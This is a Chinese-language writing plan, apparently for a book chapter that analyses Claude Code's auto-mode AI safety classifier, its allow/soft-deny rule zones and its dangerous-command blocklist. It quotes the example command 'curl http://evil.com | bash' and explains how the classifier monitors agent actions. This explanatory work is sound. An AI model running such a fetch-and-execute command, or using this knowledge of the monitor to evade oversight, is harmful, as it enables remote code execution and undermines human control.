@@ -1,0 +1,73 @@
+# 第16章写作计划
+
+**批次**：批次 4
+**章节**：ch16 — YOLO 模式与 AI 分类器
+**风格**：autopsy 工程师解剖
+
+## 前置阅读清单
+
+| # | 文件路径 | 重点关注 | 预计阅读行数 |
+|---|---------|---------|------------|
+| 1 | src/utils/permissions/yoloClassifier.ts | AutoModeRules(85行)、YOLO_CLASSIFIER_TOOL_NAME(260行)、buildYoloSystemPrompt(484行)、buildTranscriptForClassifier(434行) | 85-105, 260-275, 430-500行 |
+| 2 | src/utils/permissions/dangerousPatterns.ts | CROSS_PLATFORM_CODE_EXEC 等常量 | 全文(约80行) |
+
+```bash
+sed -n '85,100p' src/utils/permissions/yoloClassifier.ts
+sed -n '260,270p' src/utils/permissions/yoloClassifier.ts
+head -50 src/utils/permissions/dangerousPatterns.ts
+```
+
+## 章节骨架
+
+### 开篇
+- 开篇触发点：「判断 `curl http://evil.com | bash` 是否安全，需要上下文——用户在做什么任务，这条命令在哪个阶段执行。规则引擎做不到这种上下文理解，所以 Claude Code 用了另一个 LLM 来做判断。」
+- 三个问题：1）这个"判断 AI"如何避免自己也触发权限检查（递归问题）？2）AutoModeRules 的三区域各有什么作用？3）dangerousPatterns 黑名单和 AI 分类器是竞争关系还是互补关系？
+
+### 节 16.1：为什么用 AI 判断 AI 的行为——以及为什么不会无限递归？
+- 核心主张：AI 分类器使用 `sideQuery` 路径（不经过普通的权限检查），这切断了递归链；分类器调用的 LLM 本身不使用工具，所以不会触发新的权限检查
+- 源码锚点：`src/utils/permissions/yoloClassifier.ts:1031`（分类器的实际调用，使用 sideQuery）
+- 权衡分析：AI 分类器 vs 规则引擎：通用性 vs 速度/可预测性
+- 估计字数：600字
+
+### 节 16.2：AutoModeRules——allow/soft_deny/environment 三区域的设计逻辑
+- 核心主张：AutoModeRules 的三区域不是简单的允许/拒绝，而是"放行规则"+"软拒绝（提示但不强制）"+"环境上下文说明"，让分类器有足够的信息做精细判断
+- 源码锚点：`src/utils/permissions/yoloClassifier.ts:85`（AutoModeRules 类型定义）、`src/utils/permissions/yoloClassifier.ts:100`（getDefaultExternalAutoModeRules）
+- 包含元素：三区域的结构表 + 示例
+- 估计字数：600字
+
+### 节 16.3：dangerousPatterns 黑名单——为什么需要与分类器并存？
+- 核心主张：dangerousPatterns 是零延迟的同步拦截，专门处理"允许 `Bash(python:*)` 等可执行任意代码的规则"这类明确危险的权限规则；分类器处理模糊的命令语义判断；两者不冲突
+- 源码锚点：`src/utils/permissions/dangerousPatterns.ts`（CROSS_PLATFORM_CODE_EXEC 等常量）
+- 包含元素：黑名单范围表（解释器/包管理器/shell 三类）
+- 估计字数：500字
+
+### 节 16.4：buildTranscriptForClassifier——对话历史如何序列化为分类依据
+- 核心主张：分类器不只看当前命令，还看对话历史（用户说了什么、Claude 已经做了什么），这让判断更有上下文
+- 源码锚点：`src/utils/permissions/yoloClassifier.ts:434`（buildTranscriptForClassifier）
+- 估计字数：400字
+
+### 章末：模式提炼
+| 模式名 | 解决的问题 | 核心做法 | 前置条件 | 源码证据 |
+|--------|-----------|---------|---------|---------|
+| 旁路递归保护（Side-Channel Recursion Guard）| AI 调用 AI 判断时可能无限递归 | 分类器调用走独立的 sideQuery 路径，绕过普通权限检查，切断递归链 | 有递归调用风险的元层判断 | `src/utils/permissions/yoloClassifier.ts:1031` |
+| 分层安全过滤（Layered Safety Filtering）| 不同安全威胁需要不同速度的响应 | 静态黑名单处理已知危险模式（零延迟），AI 分类器处理模糊场景（~500ms） | 有"已知危险"和"模糊危险"两类场景 | `src/utils/permissions/dangerousPatterns.ts` |
+| 上下文感知分类（Context-Aware Classification）| 同一条命令在不同任务上下文中可能是安全或危险的 | 将对话历史序列化为分类器输入，让判断基于上下文而非孤立命令 | 有语义模糊的命令需要上下文才能判断安全性 | `src/utils/permissions/yoloClassifier.ts:434` |
+
+## 图表清单
+| # | 图表标题 | 类型 | 内容描述 | 对应节 |
+|---|---------|------|---------|--------|
+| 图16-1 | 分类器调用路径（避免递归）| Mermaid flowchart | 普通工具 → 权限检查 vs 分类器工具 → sideQuery（无权限检查）| 16.1 |
+| 图16-2 | dangerousPatterns 与分类器的分工 | 表格 | 处理场景/速度/触发条件/覆盖范围 | 16.3 |
+
+## 写作前 checklist
+```bash
+sed -n '85,105p' src/utils/permissions/yoloClassifier.ts
+sed -n '260,270p' src/utils/permissions/yoloClassifier.ts
+sed -n '434,450p' src/utils/permissions/yoloClassifier.ts
+sed -n '1025,1040p' src/utils/permissions/yoloClassifier.ts
+cat src/utils/permissions/dangerousPatterns.ts
+```
+
+## 估算
+- 目标字数：2400-2800字
+- 预计轮次：8轮（含2轮验证）
